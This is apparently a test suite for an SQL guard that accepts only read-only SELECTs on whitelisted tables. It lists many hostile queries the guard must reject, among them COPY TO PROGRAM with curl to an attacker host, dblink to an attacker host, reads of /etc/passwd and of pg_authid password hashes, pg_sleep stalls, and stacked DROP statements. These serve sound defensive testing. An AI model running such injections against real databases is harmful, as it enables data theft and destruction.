import { loadModule } from 'libpg-query';
import { beforeAll, describe, expect, it } from 'vitest';
import { LEGITIMATE_QUERIES } from '../../test/support/legitimate-queries.js';
import type { GuardRule } from './sql-guard-error.js';
import { SqlGuardError } from './sql-guard-error.js';
import { MAX_JOINS, SqlGuard } from './sql-guard.js';

const MAX_ROWS = 1000;
const FETCH_LIMIT = MAX_ROWS + 1;

const guard = new SqlGuard({ maxRows: MAX_ROWS, maxJoins: MAX_JOINS });

function rejection(sql: string): SqlGuardError {
  try {
    guard.validate(sql);
  } catch (error) {
    if (error instanceof SqlGuardError) {
      return error;
    }
    throw error;
  }
  throw new Error(`Expected the guard to reject: ${sql}`);
}

function expectRejected(sql: string, rule: GuardRule): void {
  expect(rejection(sql).rule).toBe(rule);
}

function expectAccepted(sql: string): void {
  expect(() => guard.validate(sql)).not.toThrow();
}

beforeAll(async () => {
  await loadModule();
});

describe('SqlGuard: statement shape', () => {
  it('accepts a single SELECT', () => {
    expectAccepted('SELECT id, name FROM regions LIMIT 10');
  });

  it('accepts a trailing semicolon and returns the statement without it', () => {
    expect(guard.validate('  SELECT id FROM regions LIMIT 10 ;  ').sql).toBe(
      'SELECT id FROM regions LIMIT 10',
    );
  });

  it.each<[string, string]>([
    ['an empty string', ''],
    ['only whitespace', '   \n  '],
    ['only a comment', '-- nothing here'],
    ['only a semicolon', ';'],
  ])('rejects %s as an empty query', (_description, sql) => {
    expectRejected(sql, 'EMPTY_QUERY');
  });

  it.each<[string, string]>([
    ['a misspelled keyword', 'SELEC 1'],
    ['an unterminated string', "SELECT 'abc"],
    ['an unterminated block comment', 'SELECT 1 /* never closed'],
    ['unbalanced parentheses', 'SELECT (1'],
  ])('reports %s as a syntax error', (_description, sql) => {
    expectRejected(sql, 'SYNTAX_ERROR');
  });

  it('passes the parser message on for a syntax error', () => {
    expect(rejection('SELEC 1').message).toContain('syntax error at or near "SELEC"');
  });

  it.each<[string, string]>([
    ['two SELECTs', 'SELECT 1; SELECT 2'],
    ['a SELECT followed by DROP', 'SELECT id FROM regions; DROP TABLE regions'],
    ['a statement hidden after a comment', 'SELECT 1; -- harmless\nDELETE FROM regions'],
    ['a statement after a block comment', 'SELECT 1 /* x */; UPDATE regions SET name = 1'],
    ['a SET before the SELECT', 'SET statement_timeout = 0; SELECT 1'],
  ])('rejects %s', (_description, sql) => {
    expectRejected(sql, 'MULTIPLE_STATEMENTS');
  });

  it.each<[string, string]>([
    ['INSERT', "INSERT INTO regions (name) VALUES ('Leste')"],
    ['UPDATE', "UPDATE regions SET name = 'Leste'"],
    ['DELETE', 'DELETE FROM order_items'],
    ['MERGE', 'MERGE INTO regions r USING products p ON false WHEN MATCHED THEN DELETE'],
    ['TRUNCATE', 'TRUNCATE order_items'],
    ['DROP TABLE', 'DROP TABLE order_items'],
    ['CREATE TABLE', 'CREATE TABLE intruder (id int)'],
    ['CREATE TABLE AS', 'CREATE TABLE intruder AS SELECT * FROM regions'],
    ['ALTER TABLE', 'ALTER TABLE regions ADD COLUMN note text'],
    ['GRANT', 'GRANT ALL ON regions TO PUBLIC'],
    ['SET', 'SET statement_timeout = 0'],
    ['RESET', 'RESET statement_timeout'],
    ['SHOW', 'SHOW server_version'],
    ['EXPLAIN', 'EXPLAIN SELECT * FROM regions'],
    ['EXPLAIN ANALYZE of a write', 'EXPLAIN ANALYZE DELETE FROM regions'],
    ['COPY to a program', "COPY regions TO PROGRAM 'curl attacker.example'"],
    ['DO block', 'DO $$ BEGIN PERFORM pg_sleep(10); END $$'],
    ['CALL', 'CALL some_procedure()'],
    ['PREPARE', 'PREPARE q AS SELECT 1'],
    ['BEGIN', 'BEGIN'],
    ['COMMIT', 'COMMIT'],
    ['LISTEN', 'LISTEN channel'],
    ['VACUUM', 'VACUUM regions'],
    ['mixed-case delete', 'dElEtE fRoM regions'],
  ])('rejects %s, which is not a SELECT', (_description, sql) => {
    expectRejected(sql, 'NOT_A_SELECT');
  });

  it('validates the tree, not the text: SQL keywords inside a string are harmless', () => {
    expectAccepted("SELECT name FROM regions WHERE name = $$x'; DROP TABLE regions; --$$ LIMIT 1");
    expectAccepted("SELECT 'DELETE FROM regions; pg_sleep(10)' AS note LIMIT 1");
    expectAccepted('SELECT name AS "drop table" FROM regions LIMIT 1');
  });
});

describe('SqlGuard: data-changing and locking clauses inside a SELECT', () => {
  it.each<[string, string]>([
    ['DELETE in a CTE', 'WITH gone AS (DELETE FROM orders RETURNING *) SELECT * FROM gone'],
    [
      'INSERT in a CTE',
      "WITH added AS (INSERT INTO regions (name) VALUES ('x') RETURNING *) SELECT * FROM added",
    ],
    [
      'UPDATE in a CTE',
      "WITH changed AS (UPDATE regions SET name = 'x' RETURNING *) SELECT * FROM changed",
    ],
    [
      'DELETE in a nested CTE',
      'SELECT * FROM (WITH gone AS (DELETE FROM orders RETURNING id) SELECT * FROM gone) s',
    ],
  ])('rejects %s', (_description, sql) => {
    expectRejected(sql, 'NOT_A_SELECT');
  });

  it.each<[string, string]>([
    ['SELECT INTO', 'SELECT * INTO copy_of_regions FROM regions'],
    ['SELECT INTO TEMP', 'SELECT * INTO TEMP copy_of_regions FROM regions'],
    ['FOR UPDATE', 'SELECT * FROM regions FOR UPDATE'],
    ['FOR SHARE', 'SELECT * FROM regions FOR SHARE'],
    ['FOR NO KEY UPDATE', 'SELECT * FROM regions FOR NO KEY UPDATE'],
    ['FOR UPDATE in a subquery', 'SELECT * FROM (SELECT * FROM regions FOR UPDATE) s'],
    ['FOR UPDATE in a CTE', 'WITH r AS (SELECT * FROM regions FOR UPDATE) SELECT * FROM r'],
    [
      'WITH RECURSIVE',
      'WITH RECURSIVE n AS (SELECT 1 AS i UNION ALL SELECT i + 1 FROM n) SELECT * FROM n',
    ],
    ['TABLESAMPLE', 'SELECT * FROM orders TABLESAMPLE SYSTEM (10)'],
    ['a bind parameter', 'SELECT * FROM regions WHERE id = $1'],
    ['a column list on a function', 'SELECT * FROM generate_series(1, 3) AS g (n int)'],
    ['ROWS FROM', 'SELECT * FROM ROWS FROM (generate_series(1, 3)) AS g'],
    ['an XML expression', "SELECT xmlelement(name foo, 'bar')"],
    ['a JSON constructor', "SELECT JSON_OBJECT('a': 1)"],
    ['COLLATE', 'SELECT name COLLATE "C" FROM regions'],
    ['array subscripting', 'SELECT (ARRAY[1, 2])[1]'],
    ['field selection from a row', 'SELECT (regions).name FROM regions'],
    ['a named function argument', 'SELECT round(v => 1.5)'],
    ['a VARIADIC call', "SELECT concat(VARIADIC ARRAY['a', 'b'])"],
    ['ORDER BY USING', 'SELECT name FROM regions ORDER BY name USING <'],
    ['a reference to another database', 'SELECT * FROM otherdb.sales.regions'],
  ])('rejects %s', (_description, sql) => {
    expectRejected(sql, 'UNSUPPORTED_CONSTRUCT');
  });

  it('explains the most common rejections in plain language', () => {
    expect(rejection('SELECT * INTO t FROM regions').message).toBe(
      'SELECT ... INTO não é permitido.',
    );
    expect(rejection('SELECT * FROM regions FOR UPDATE').message).toBe(
      'FOR UPDATE / FOR SHARE não é permitido.',
    );
  });
});

describe('SqlGuard: tables', () => {
  it.each<[string, string]>([
    ['an exposed table', 'SELECT * FROM orders LIMIT 1'],
    ['an exposed table qualified with its schema', 'SELECT * FROM sales.orders LIMIT 1'],
    ['an aliased table', 'SELECT o.id FROM orders AS o LIMIT 1'],
    ['a CTE over an exposed table', 'WITH recent AS (SELECT * FROM orders) SELECT * FROM recent'],
    [
      'a CTE that uses an earlier CTE',
      'WITH a AS (SELECT id FROM orders), b AS (SELECT id FROM a) SELECT * FROM b',
    ],
    ['a subquery in FROM', 'SELECT s.id FROM (SELECT id FROM orders) AS s'],
    ['no table at all', 'SELECT 1 + 1 AS two'],
    ['VALUES', "VALUES (1, 'a'), (2, 'b')"],
  ])('accepts %s', (_description, sql) => {
    expectAccepted(sql);
  });

  it.each<[string, string]>([
    ['an unknown table', 'SELECT * FROM invoices'],
    ['a table of the app schema', 'SELECT * FROM app.users'],
    ['the migration history', 'SELECT * FROM migrations.pgmigrations'],
    ['a system catalog, unqualified', 'SELECT * FROM pg_class'],
    ['a system catalog, qualified', 'SELECT * FROM pg_catalog.pg_roles'],
    ['password hashes', 'SELECT * FROM pg_authid'],
    ['running queries', 'SELECT * FROM pg_stat_activity'],
    ['server settings', 'SELECT * FROM pg_settings'],
    ['information_schema', 'SELECT * FROM information_schema.tables'],
    ['an exposed name in another schema', 'SELECT * FROM public.orders'],
    ['an exposed name in pg_catalog', 'SELECT * FROM pg_catalog.orders'],
    ['a quoted name with different case', 'SELECT * FROM "Orders"'],
    ['a forbidden table in a subquery', 'SELECT * FROM (SELECT * FROM pg_class) s'],
    ['a forbidden table in a CTE', 'WITH c AS (SELECT * FROM pg_class) SELECT * FROM c'],
    ['a forbidden table in WHERE', 'SELECT 1 WHERE EXISTS (SELECT 1 FROM pg_authid)'],
    ['a forbidden table in the select list', 'SELECT (SELECT count(*) FROM pg_class)'],
    ['a forbidden table in HAVING', 'SELECT 1 HAVING (SELECT count(*) FROM pg_class) > 0'],
    ['a forbidden table in ORDER BY', 'SELECT 1 ORDER BY (SELECT count(*) FROM pg_class)'],
    [
      'a forbidden table in a JOIN condition',
      'SELECT 1 FROM regions r JOIN products p ON p.id IN (SELECT oid FROM pg_class)',
    ],
    ['a forbidden table in LIMIT', 'SELECT * FROM regions LIMIT (SELECT count(*) FROM pg_class)'],
    [
      'a forbidden table in a UNION branch',
      'SELECT name FROM regions UNION SELECT relname FROM pg_class',
    ],
    [
      'a forbidden table in a window',
      'SELECT sum(1) OVER (ORDER BY (SELECT count(*) FROM pg_class))',
    ],
    [
      'a forbidden table in an aggregate filter',
      'SELECT count(*) FILTER (WHERE EXISTS (SELECT 1 FROM pg_class))',
    ],
    ['a forbidden table in CASE', 'SELECT CASE WHEN EXISTS (SELECT 1 FROM pg_class) THEN 1 END'],
    ['a forbidden table in VALUES', 'VALUES ((SELECT count(*) FROM pg_class))'],
  ])('rejects %s', (_description, sql) => {
    expectRejected(sql, 'TABLE_NOT_ALLOWED');
  });

  it('lists the available tables in the rejection', () => {
    expect(rejection('SELECT * FROM invoices').message).toBe(
      'A tabela "invoices" não está disponível para consulta. ' +
        'Tabelas disponíveis: regions, products, customers, orders, order_items, ' +
        'distribution_centers, stock_levels, stock_movements.',
    );
  });

  describe('CTE names cannot be used to smuggle a real relation', () => {
    it('rejects a CTE named like a system catalog', () => {
      expectRejected(
        'WITH pg_authid AS (SELECT 1 AS rolpassword) SELECT * FROM pg_authid',
        'TABLE_NOT_ALLOWED',
      );
    });

    it('rejects a CTE name used outside the SELECT that declares it', () => {
      expectRejected(
        'SELECT * FROM (WITH secrets AS (SELECT 1) SELECT * FROM secrets) s, secrets',
        'TABLE_NOT_ALLOWED',
      );
    });

    it('rejects a CTE that refers to one declared after it', () => {
      expectRejected(
        'WITH a AS (SELECT * FROM b), b AS (SELECT 1) SELECT * FROM a',
        'TABLE_NOT_ALLOWED',
      );
    });

    it('rejects a CTE that refers to itself', () => {
      expectRejected('WITH loop AS (SELECT * FROM loop) SELECT * FROM loop', 'TABLE_NOT_ALLOWED');
    });

    it('does not treat a schema-qualified name as a CTE reference', () => {
      expectRejected('WITH users AS (SELECT 1) SELECT * FROM app.users', 'TABLE_NOT_ALLOWED');
    });

    it('lets an inner query see a CTE of an outer query', () => {
      expectAccepted(
        'WITH recent AS (SELECT id FROM orders) SELECT * FROM regions WHERE id IN (SELECT id FROM recent)',
      );
    });
  });
});

describe('SqlGuard: functions', () => {
  it.each<[string, string]>([
    [
      'aggregates',
      'SELECT count(*), sum(quantity), avg(unit_price), min(id), max(id) FROM order_items',
    ],
    ['a distinct aggregate', 'SELECT count(DISTINCT customer_id) FROM orders'],
    ['an aggregate with FILTER', "SELECT count(*) FILTER (WHERE status = 'paid') FROM orders"],
    ['an ordered aggregate', "SELECT string_agg(name, ', ' ORDER BY name) FROM regions"],
    [
      'an ordered-set aggregate',
      'SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY price) FROM products',
    ],
    [
      'window functions',
      'SELECT id, row_number() OVER (PARTITION BY customer_id ORDER BY ordered_at) FROM orders',
    ],
    ['a named window', 'SELECT rank() OVER w FROM orders WINDOW w AS (ORDER BY ordered_at)'],
    [
      'date functions',
      "SELECT date_trunc('month', ordered_at), now(), age(ordered_at) FROM orders",
    ],
    ['EXTRACT', 'SELECT EXTRACT(year FROM ordered_at) FROM orders'],
    ['AT TIME ZONE', "SELECT ordered_at AT TIME ZONE 'America/Sao_Paulo' FROM orders"],
    ['current date and time keywords', 'SELECT CURRENT_DATE, CURRENT_TIMESTAMP, LOCALTIMESTAMP'],
    ['text functions', "SELECT upper(name), length(name), replace(name, 'a', 'b') FROM regions"],
    ['SUBSTRING and TRIM syntax', 'SELECT substring(name FROM 1 FOR 3), trim(name) FROM regions'],
    ['LIKE with ESCAPE', "SELECT name FROM regions WHERE name LIKE 'S!%' ESCAPE '!'"],
    ['math functions', 'SELECT round(price, 1), abs(price), floor(price) FROM products'],
    [
      'COALESCE, NULLIF, GREATEST',
      'SELECT coalesce(name, $$-$$), nullif(id, 0), greatest(id, 1) FROM regions',
    ],
    ['a function qualified with pg_catalog', 'SELECT pg_catalog.count(*) FROM orders'],
    ['an upper-case function name', 'SELECT COUNT(*), UPPER(name) FROM regions GROUP BY name'],
    ['generate_series in FROM', 'SELECT * FROM generate_series(1, 12) AS month'],
  ])('accepts %s', (_description, sql) => {
    expectAccepted(sql);
  });

  it.each<[string, string]>([
    ['pg_sleep', 'SELECT pg_sleep(10)'],
    ['pg_sleep qualified with pg_catalog', 'SELECT pg_catalog.pg_sleep(10)'],
    ['pg_sleep in mixed case', 'SELECT PG_SLEEP(10)'],
    ['pg_sleep as a quoted identifier', 'SELECT "pg_sleep"(10)'],
    ['pg_sleep written with unicode escapes', 'SELECT U&"\\0070g_sleep"(10)'],
    ['pg_sleep in WHERE', 'SELECT * FROM regions WHERE pg_sleep(10) IS NULL'],
    ['pg_sleep in a subquery', 'SELECT * FROM regions WHERE id IN (SELECT 1 FROM pg_sleep(10))'],
    ['pg_sleep in FROM', 'SELECT * FROM pg_sleep(10)'],
    ['pg_sleep in ORDER BY', 'SELECT name FROM regions ORDER BY pg_sleep(10)'],
    [
      'pg_sleep in a JOIN condition',
      'SELECT 1 FROM regions a JOIN regions b ON pg_sleep(10) IS NULL',
    ],
    ['pg_sleep as an aggregate argument', 'SELECT count(pg_sleep(10)) FROM regions'],
    [
      'pg_sleep in an aggregate FILTER',
      'SELECT count(*) FILTER (WHERE pg_sleep(10) IS NULL) FROM regions',
    ],
    [
      'pg_sleep in a window definition',
      'SELECT count(*) OVER (ORDER BY pg_sleep(10)) FROM regions',
    ],
    ['pg_sleep in CASE', 'SELECT CASE WHEN true THEN pg_sleep(10) END'],
    ['pg_sleep in a LIMIT expression', 'SELECT * FROM regions OFFSET (SELECT 1 FROM pg_sleep(10))'],
    ['pg_sleep_for', "SELECT pg_sleep_for('10 seconds')"],
    ['pg_read_file', "SELECT pg_read_file('/etc/passwd')"],
    ['pg_read_binary_file', "SELECT pg_read_binary_file('/etc/passwd')"],
    ['pg_ls_dir', "SELECT pg_ls_dir('.')"],
    ['pg_stat_file', "SELECT pg_stat_file('postgresql.conf')"],
    ['lo_import', "SELECT lo_import('/etc/passwd')"],
    ['lo_export', "SELECT lo_export(1, '/tmp/x')"],
    ['lo_create', 'SELECT lo_create(0)'],
    ['lo_from_bytea', "SELECT lo_from_bytea(0, 'x')"],
    ['dblink', "SELECT * FROM dblink('host=attacker.example', 'SELECT 1')"],
    ['dblink_connect', "SELECT dblink_connect('host=attacker.example')"],
    ['set_config', "SELECT set_config('statement_timeout', '0', false)"],
    ['current_setting', "SELECT current_setting('data_directory')"],
    ['query_to_xml', "SELECT query_to_xml('SELECT * FROM pg_authid', true, true, '')"],
    ['table_to_xml', "SELECT table_to_xml('pg_authid', true, true, '')"],
    ['pg_terminate_backend', 'SELECT pg_terminate_backend(1)'],
    ['pg_cancel_backend', 'SELECT pg_cancel_backend(1)'],
    ['pg_reload_conf', 'SELECT pg_reload_conf()'],
    ['pg_advisory_lock', 'SELECT pg_advisory_lock(1)'],
    ['pg_notify', "SELECT pg_notify('channel', 'payload')"],
    ['nextval', "SELECT nextval('sales.regions_id_seq')"],
    ['version', 'SELECT version()'],
    ['current_database', 'SELECT current_database()'],
    ['pg_backend_pid', 'SELECT pg_backend_pid()'],
    ['inet_server_addr', 'SELECT inet_server_addr()'],
    ['has_table_privilege', "SELECT has_table_privilege('app.users', 'SELECT')"],
    ['pg_get_viewdef', "SELECT pg_get_viewdef('pg_roles')"],
    ['repeat (memory exhaustion)', "SELECT repeat('x', 1000000000)"],
    ['a function in another schema', 'SELECT app.count(1)'],
    ['an allowed name qualified with another schema', 'SELECT public.count(*) FROM orders'],
    ['an unknown function', 'SELECT definitely_not_a_function(1)'],
  ])('rejects %s', (_description, sql) => {
    expectRejected(sql, 'FUNCTION_NOT_ALLOWED');
  });

  it.each<[string, string]>([
    ['CURRENT_USER', 'SELECT CURRENT_USER'],
    ['SESSION_USER', 'SELECT SESSION_USER'],
    ['CURRENT_CATALOG', 'SELECT CURRENT_CATALOG'],
    ['CURRENT_SCHEMA', 'SELECT CURRENT_SCHEMA'],
    ['CURRENT_ROLE', 'SELECT CURRENT_ROLE'],
  ])('rejects the session keyword %s', (_description, sql) => {
    expectRejected(sql, 'FUNCTION_NOT_ALLOWED');
  });

  it('rejects a schema-qualified operator', () => {
    expectRejected('SELECT 1 OPERATOR(app.+) 1', 'FUNCTION_NOT_ALLOWED');
  });

  it('accepts a built-in operator written with OPERATOR()', () => {
    expectAccepted('SELECT 1 OPERATOR(pg_catalog.+) 1');
  });

  it('names the function in the rejection', () => {
    expect(rejection('SELECT pg_catalog.pg_sleep(10)').message).toBe(
      'A função "pg_catalog.pg_sleep" não é permitida.',
    );
  });
});

describe('SqlGuard: casts', () => {
  it.each<[string, string]>([
    ['integer', "SELECT '1'::int"],
    ['numeric with precision', 'SELECT CAST(price AS numeric(10, 2)) FROM products'],
    ['text', 'SELECT id::text FROM regions'],
    ['date', 'SELECT ordered_at::date FROM orders'],
    ['timestamptz', "SELECT '2026-01-01'::timestamptz"],
    ['an interval literal', "SELECT now() - interval '3 months'"],
    ['a typed literal', "SELECT date '2026-01-01'"],
  ])('accepts a cast to %s', (_description, sql) => {
    expectAccepted(sql);
  });

  it.each<[string, string]>([
    ['regclass', "SELECT 'pg_authid'::regclass"],
    ['regproc', "SELECT 'pg_sleep'::regproc"],
    ['regrole', "SELECT 'postgres'::regrole"],
    ['regnamespace', "SELECT 'app'::regnamespace"],
    ['oid', "SELECT '1'::oid"],
    ['xml', "SELECT '<a/>'::xml"],
    ['json', "SELECT '{}'::json"],
    ['jsonb', "SELECT '{}'::jsonb"],
    ['bytea', "SELECT 'x'::bytea"],
    ['an array type', "SELECT '{1,2}'::int[]"],
    ['a type in another schema', "SELECT 'x'::app.secret_type"],
    ['a table row type', 'SELECT NULL::pg_authid'],
  ])('rejects a cast to %s', (_description, sql) => {
    expect(['TYPE_NOT_ALLOWED', 'UNSUPPORTED_CONSTRUCT']).toContain(rejection(sql).rule);
  });
});

describe('SqlGuard: JOIN limit', () => {
  it('accepts the widest legitimate query: all five tables', () => {
    expectAccepted(
      `SELECT r.name, p.category, sum(i.quantity * i.unit_price)
       FROM order_items i
       JOIN orders o ON o.id = i.order_id
       JOIN customers c ON c.id = o.customer_id
       JOIN regions r ON r.id = c.region_id
       JOIN products p ON p.id = i.product_id
       GROUP BY r.name, p.category`,
    );
  });

  it(`accepts exactly ${String(MAX_JOINS)} JOINs`, () => {
    expectAccepted(
      'SELECT 1 FROM regions a JOIN regions b ON true JOIN regions c ON true JOIN regions d ON true JOIN regions e ON true JOIN regions f ON true',
    );
  });

  it.each<[string, string]>([
    [
      'six explicit JOINs',
      'SELECT 1 FROM regions a JOIN regions b ON true JOIN regions c ON true JOIN regions d ON true JOIN regions e ON true JOIN regions f ON true JOIN regions g ON true',
    ],
    [
      'seven comma-separated tables',
      'SELECT 1 FROM regions a, regions b, regions c, regions d, regions e, regions f, regions g',
    ],
    [
      'explicit and comma joins mixed',
      'SELECT 1 FROM regions a JOIN regions b ON true JOIN regions c ON true, regions d JOIN regions e ON true JOIN regions f ON true, regions g',
    ],
    [
      'joins split between a subquery and the outer query',
      `SELECT 1 FROM (SELECT a.id FROM regions a JOIN regions b ON true JOIN regions c ON true JOIN regions d ON true) s
       JOIN regions e ON true JOIN regions f ON true JOIN regions g ON true`,
    ],
    [
      'joins split between a CTE and the body',
      `WITH wide AS (SELECT a.id FROM regions a JOIN regions b ON true JOIN regions c ON true JOIN regions d ON true)
       SELECT 1 FROM wide JOIN regions e ON true JOIN regions f ON true JOIN regions g ON true`,
    ],
    [
      'joins split between UNION branches',
      `SELECT 1 FROM regions a JOIN regions b ON true JOIN regions c ON true JOIN regions d ON true
       UNION ALL
       SELECT 1 FROM regions a JOIN regions b ON true JOIN regions c ON true JOIN regions d ON true`,
    ],
    [
      'joins hidden in a WHERE subquery',
      `SELECT 1 FROM regions a JOIN regions b ON true JOIN regions c ON true JOIN regions h ON true
       WHERE EXISTS (SELECT 1 FROM regions d JOIN regions e ON true JOIN regions f ON true JOIN regions g ON true)`,
    ],
    [
      'CROSS JOINs',
      'SELECT 1 FROM regions a CROSS JOIN regions b CROSS JOIN regions c CROSS JOIN regions d CROSS JOIN regions e CROSS JOIN regions f CROSS JOIN regions g',
    ],
  ])('rejects %s', (_description, sql) => {
    expectRejected(sql, 'TOO_MANY_JOINS');
  });

  it('reports how many JOINs were found', () => {
    expect(
      rejection(
        'SELECT 1 FROM regions a, regions b, regions c, regions d, regions e, regions f, regions g',
      ).message,
    ).toBe('A consulta usa 6 JOINs; o máximo permitido é 5.');
  });
});

describe('SqlGuard: LIMIT', () => {
  it('leaves a LIMIT within the maximum untouched', () => {
    expect(guard.validate('SELECT id FROM orders LIMIT 50')).toEqual({
      sql: 'SELECT id FROM orders LIMIT 50',
      limitRewritten: false,
    });
  });

  it('leaves a LIMIT equal to the maximum untouched', () => {
    expect(guard.validate(`SELECT id FROM orders LIMIT ${String(MAX_ROWS)}`).limitRewritten).toBe(
      false,
    );
  });

  it('accepts LIMIT 0 and FETCH FIRST', () => {
    expect(guard.validate('SELECT id FROM orders LIMIT 0').limitRewritten).toBe(false);
    expect(guard.validate('SELECT id FROM orders FETCH FIRST 5 ROWS ONLY').limitRewritten).toBe(
      false,
    );
  });

  it('appends a LIMIT when there is none', () => {
    expect(guard.validate('SELECT id FROM orders ORDER BY id')).toEqual({
      sql: `SELECT id FROM orders ORDER BY id\nLIMIT ${String(FETCH_LIMIT)}`,
      limitRewritten: true,
    });
  });

  it('appends the LIMIT after a trailing line comment, not inside it', () => {
    const guarded = guard.validate('SELECT id FROM orders -- all of them');

    expect(guarded.sql).toBe(`SELECT id FROM orders -- all of them\nLIMIT ${String(FETCH_LIMIT)}`);
  });

  it('applies the appended LIMIT to a whole UNION', () => {
    const guarded = guard.validate('SELECT id FROM orders UNION ALL SELECT id FROM customers');

    expect(guarded.sql.endsWith(`\nLIMIT ${String(FETCH_LIMIT)}`)).toBe(true);
  });

  it('keeps an OFFSET when appending the LIMIT', () => {
    const guarded = guard.validate('SELECT id FROM orders ORDER BY id OFFSET 20');

    expect(guarded.sql).toBe(
      `SELECT id FROM orders ORDER BY id OFFSET 20\nLIMIT ${String(FETCH_LIMIT)}`,
    );
  });

  it.each<[string, string]>([
    ['a LIMIT above the maximum', 'SELECT id FROM orders LIMIT 5000'],
    ['a LIMIT too large for an integer', 'SELECT id FROM orders LIMIT 99999999999'],
    ['LIMIT ALL', 'SELECT id FROM orders LIMIT ALL'],
    ['LIMIT NULL', 'SELECT id FROM orders LIMIT NULL'],
    ['a FETCH FIRST above the maximum', 'SELECT id FROM orders FETCH FIRST 5000 ROWS ONLY'],
  ])('wraps the query to cap %s', (_description, sql) => {
    expect(guard.validate(sql)).toEqual({
      sql: `SELECT * FROM (\n${sql}\n) AS limited_query\nLIMIT ${String(FETCH_LIMIT)}`,
      limitRewritten: true,
    });
  });

  it.each<[string, string]>([
    ['a subquery', 'SELECT id FROM orders LIMIT (SELECT 5)'],
    ['an arithmetic expression', 'SELECT id FROM orders LIMIT 2 + 3'],
    ['a string', "SELECT id FROM orders LIMIT '5'"],
    ['a cast', "SELECT id FROM orders LIMIT '5'::int"],
    ['a negative number', 'SELECT id FROM orders LIMIT -1'],
    ['WITH TIES', 'SELECT id FROM orders ORDER BY id FETCH FIRST 5 ROWS WITH TIES'],
  ])('rejects a LIMIT written as %s', (_description, sql) => {
    expectRejected(sql, 'INVALID_LIMIT');
  });

  it('does not let a LIMIT in a subquery count as the top-level LIMIT', () => {
    const guarded = guard.validate('SELECT * FROM (SELECT id FROM orders LIMIT 5) s');

    expect(guarded.limitRewritten).toBe(true);
  });

  it('does not let a LIMIT in one UNION branch count as the top-level LIMIT', () => {
    const guarded = guard.validate(
      '(SELECT id FROM orders LIMIT 5) UNION ALL (SELECT id FROM customers)',
    );

    expect(guarded.limitRewritten).toBe(true);
  });
});

describe('SqlGuard: complexity', () => {
  // The parser discards redundant parentheses, so they add no depth to the tree.
  it('accepts redundant parentheses, however many', () => {
    const depth = 400;

    expectAccepted(`SELECT ${'('.repeat(depth)}1${')'.repeat(depth)}`);
  });

  function nestedCalls(depth: number): string {
    return `SELECT ${'abs('.repeat(depth)}1${')'.repeat(depth)}`;
  }

  it('accepts moderately nested function calls', () => {
    expectAccepted(nestedCalls(50));
  });

  it('rejects deeply nested function calls', () => {
    expectRejected(nestedCalls(400), 'QUERY_TOO_COMPLEX');
  });

  it('rejects deeply nested subqueries', () => {
    const depth = 200;

    expectRejected(
      `${'SELECT * FROM ('.repeat(depth)}SELECT 1${') s'.repeat(depth)}`,
      'QUERY_TOO_COMPLEX',
    );
  });

  // 1,998 levels is the deepest nesting that fits in the 10,000 characters the
  // API accepts. The parser must survive it: a crashed parser would deny every
  // query that came afterwards.
  it('rejects the deepest nesting the API can receive and keeps working', () => {
    const deepest = nestedCalls(1998);
    expect(deepest.length).toBeLessThanOrEqual(10_000);

    expectRejected(deepest, 'QUERY_TOO_COMPLEX');
    expectAccepted('SELECT id FROM regions LIMIT 1');
  });
});

describe('SqlGuard: legitimate queries', () => {
  it.each(LEGITIMATE_QUERIES)('accepts: %s', (_description, sql) => {
    expectAccepted(sql);
  });
});
